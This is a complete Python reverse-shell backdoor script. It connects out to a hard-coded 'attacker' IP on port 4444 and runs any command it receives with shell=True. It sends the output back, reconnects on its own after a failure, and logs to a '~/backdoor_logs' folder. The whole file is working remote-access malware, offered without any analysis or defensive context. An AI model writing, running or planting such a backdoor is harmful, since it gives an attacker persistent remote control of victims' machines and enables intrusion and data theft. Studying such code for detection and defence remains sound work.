#!/usr/bin/env python3

import socket
import subprocess
import os
import time
import sys
import atexit

# Configuration
SERVER_IP = "192.168.0.102"  # Replace with the attacker's IP address
SERVER_PORT = 4444         # Replace with the attacker's port number
RECONNECT_DELAY = 10       # Seconds to wait before reconnecting

def setup_logging():
    log_dir = os.path.expanduser('~/backdoor_logs')
    os.makedirs(log_dir, exist_ok=True)
    sys.stdout = open(os.path.join(log_dir, 'backdoor.log'), 'a')
    sys.stderr = open(os.path.join(log_dir, 'backdoor_error.log'), 'a')
    atexit.register(lambda: sys.stdout.close() if sys.stdout else None)
    atexit.register(lambda: sys.stderr.close() if sys.stderr else None)

def connect():
    while True:
        try:
            print("Attempting to connect to the server...", flush=True)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("Connected to the server.", flush=True)

            while True:
                command = s.recv(1024).decode().strip()  # Trim whitespace
                if not command:
                    continue
                if command.lower() == 'exit':
                    break
                elif command.startswith('cd '):
                    try:
                        target_dir = command[3:].strip()
                        os.chdir(target_dir)
                        s.send(b"Changed directory")
                    except Exception as e:
                        s.send(str(e).encode())
                elif command == 'pwd':
                    try:
                        current_dir = os.getcwd()
                        s.send(current_dir.encode())
                    except Exception as e:
                        s.send(str(e).encode())
                elif command == 'ls':
                    try:
                        output = subprocess.check_output('ls', shell=True)
                        s.send(output)
                    except Exception as e:
                        s.send(str(e).encode())
                else:
                    try:
                        output = subprocess.check_output(command, shell=True)
                        s.send(output)
                    except Exception as e:
                        s.send(str(e).encode())
            s.close()
        except Exception as e:
            print(f"Connection error: {e}", file=sys.stderr)
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    setup_logging()
    connect()

